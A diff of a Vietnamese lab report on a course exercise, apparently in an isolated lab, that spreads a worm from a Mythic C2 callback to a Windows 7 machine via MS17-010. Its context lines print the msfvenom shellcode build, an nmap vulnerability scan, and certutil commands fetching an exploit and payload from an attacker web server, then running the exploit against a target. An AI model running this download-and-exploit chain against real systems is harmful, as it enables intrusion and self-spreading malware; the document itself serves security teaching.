@@ -243,13 +243,13 @@ msfvenom -p windows/x64/exec EXITFUNC=thread \
 cat ~/lab2/cau9/sc_x64_kernel.bin stager_wmic.bin > sc_wmic.bin
 ls -l stager_wmic.bin sc_wmic.bin
 ```
--> `Payload size: 510 bytes`, khối ghép lại là `772 + 510 = 1282` byte, chiếm `1.69%` buffer nên thừa chỗ
+-> `Payload size: 510 bytes`, khối ghép lại là `772 + 510 = 1282` byte, chiếm ít buffer 
 
-=> giữ nguyên phần kernel `772` byte của buổi trước nên đường vào không đổi, chỉ đổi thứ chạy sau khi đã vào được. Các bước trong stager nối bằng `&` chứ không phải `&&`, vì `certutil` trả mã khác 0 khi server trả `404` và dấu `&&` sẽ cắt đứt phần còn lại
+=> giữ nguyên phần kernel `772` byte của buổi trước nên đường vào không đổi, chỉ đổi thứ chạy sau khi đã vào được. Các bước trong stager nối bằng `&`, vì `certutil` trả mã khác 0 khi server trả `404` nếu dấu `&&` sẽ cắt đứt phần còn lại
 
 ### Đẩy worm xuống bot rồi bắn từ chính C2 (mục b)
 
-Đề bắt triển khai worm **từ** hệ thống C2, nên em không dùng `certutil` tay như Câu 5 mà gõ mọi thứ qua ô lệnh của callback Victim 1. Bản worm em dùng là file `.exe` PyInstaller đã đóng gói ở buổi trước, buổi đó nó chết trên Windows 7 vì thiếu `api-ms-win-crt-runtime-l1-1-0.dll`, nhưng ở đây nó chạy trên Victim 1 là Windows 10 nên có sẵn thư viện đó.
+Đề bắt triển khai worm từ hệ thống C2, nên em không dùng `certutil` tay như Câu 5 mà gõ mọi thứ qua ô lệnh của callback Victim 1. Bản worm em dùng là file `.exe` PyInstaller đã đóng gói ở buổi trước, buổi đó nó chết trên Windows 7 vì thiếu `api-ms-win-crt-runtime-l1-1-0.dll`, nhưng ở đây nó chạy trên Victim 1 là Windows 10 nên có sẵn thư viện đó.
 
 **[Kali]**
 ```bash
@@ -259,7 +259,7 @@ nmap -p445 -Pn --script smb-os-discovery,smb-vuln-ms17-010 192.168.201.140
 *Hình 2. Victim 2 còn nguyên lỗ hổng MS17-010.*
 -> `State: VULNERABLE`, `CVE:CVE-2017-0143`, OS là `Windows 7 Professional 7601 Service Pack 1`
 
-**[Console Mythic - o lenh cua callback Victim 1]**
+**[Console Mythic - ô lệnh cua callback Victim 1]**
 ```
 shell certutil -urlcache -split -f http://192.168.201.50:8000/eb.exe C:\lab\eb.exe
 shell certutil -urlcache -split -f http://192.168.201.50:8000/sc_wmic.bin C:\lab\sc_wmic.bin
@@ -270,7 +270,7 @@ shell C:\lab\eb.exe 192.168.201.140 C:\lab\sc_wmic.bin
 -> `shellcode size: 1282` đúng khối đã ghép, `Target OS: Windows 7 Professional 7601 Service Pack 1`, rồi `good response status: INVALID_PARAMETER`
 
 
-Dòng `INVALID_PARAMETER` là dấu hiệu khai thác trúng chứ không phải lỗi. Kiểm ở phía web server thì `grep 192.168.201.140 ~/lab3/http.log` cho dòng `"GET /svc_update.exe HTTP/1.1" 200` với địa chỉ nguồn là Victim 2, tức stager đã chạy và máy đó tự kéo agent về. Nhưng bảng callback vẫn chỉ có một dòng.
+Dòng `INVALID_PARAMETER` là dấu hiệu khai thác đc. Kiểm ở phía web server thì `grep 192.168.201.140 ~/lab3/http.log` cho dòng `"GET /svc_update.exe HTTP/1.1" 200` với địa chỉ nguồn là Victim 2, tức stager đã chạy và máy đó tự kéo agent về. Nhưng bảng callback vẫn chỉ có một dòng.
 
 ### Bốn lượt bắn trượt và cách khoanh vùng (mục b)
 
@@ -278,7 +278,7 @@ Agent sang tới nơi mà không gọi về, em loại trừ dần, mỗi giả 
 
 - `start` làm agent chết theo tiến trình cha : **sai**, đổi sang `wmic process call create` và cắm mốc `WMIC_FIRED` ở cuối chuỗi, mốc có hiện trong log mà callback vẫn không lên
 - `wmic` kén đường dẫn không có dấu nháy : **sai**, chạy thử cả hai kiểu trên Victim 1 đều trả `ReturnValue = 0`
-- máy thứ hai thiếu .NET : **đúng một nửa**, stager dò bằng `if exist` trả về đường dẫn `PROBE_NET4_NO`, em cài .NET 4.0 cho nó, mốc `NET4_OK` hiện trong log nhưng callback vẫn không lên
+- máy thứ hai thiếu .NET : gần đúng, stager dò bằng `if exist` trả về đường dẫn `PROBE_NET4_NO`, em cài .NET 4.0 cho nó, mốc `NET4_OK` hiện trong log nhưng callback vẫn không lên
 - .NET cài với cờ `/norestart` nên chưa đăng ký : **sai**, khởi động lại máy rồi bắn tiếp vẫn không gọi về
 
 Hết đường đoán từ xa, em quay về đọc mã nguồn của chính agent.
@@ -290,15 +290,16 @@ sed -n '147,151p' ~/Mythic/InstalledServices/apollo/apollo/mythic/agent_function
 ```
 ![Muc .NET agent that su can, doc tu file du an cua no](img/image-9.png)
 *Hình 4. Mức .NET agent thật sự cần, đọc từ file dự án của nó.*
--> cả `26` file `.csproj` đều khai `<TargetFramework>net451</TargetFramework>`, trong khi dòng `note` mà Mythic hiển thị lại ghi `A fully featured .NET 4.0 compatible training agent`
+ 
+ -> cả `26` file `.csproj` đều khai `<TargetFramework>net451</TargetFramework>`, trong khi dòng `note` mà Mythic hiển thị lại ghi `A fully featured .NET 4.0 compatible training agent`
 
 `net451` là .NET Framework `4.5.1`. Em cài `4.0` vì tin dòng `note`, mà assembly biên dịch cho `4.5.1` thì không chạy trên nền `4.0`. Victim 1 không vướng vì nó sẵn `4.6.00079`.
 
-=> ba giả thuyết đầu đều bắt nguồn từ việc em tin dòng `note` của agent thay vì đọc file dự án của nó. lệnh `grep` trên `.csproj` ngay từ đầu đã tiết kiệm được các lượt bắn
+=> ba giả thuyết đầu đều bắt nguồn từ việc em tin `note` của agent thay vì đọc file dự án của nó. lệnh `grep` trên `.csproj` ngay từ đầu đã tiết kiệm được các lượt bắn
 
 ### Cài đúng mức .NET rồi bắn lại, worm lan sang thành công (mục b)
 
-Em cài .NET Framework 4.5.2 lên máy thứ hai, đây là bước chuẩn bị môi trường chứ không phải việc của worm, giống như máy đó phải bật sẵn SMBv1 thì lỗ hổng mới dùng được. Kiểm bằng khoá `Release` chứ không phải `Version`, vì mọi bản 4.x đều ghi `Version` là `4.0.30319`.
+Em cài .NET Framework 4.5.2 lên máy thứ hai, đây là bước chuẩn bị môi trường, giống như máy đó phải bật sẵn SMBv1 thì lỗ hổng mới dùng được. Kiểm bằng khoá `Release` chứ không phải `Version`, vì mọi bản 4.x đều ghi `Version` là `4.0.30319`.
 
 **[Victim 2 - Win7 - PowerShell admin]**
 ```powershell
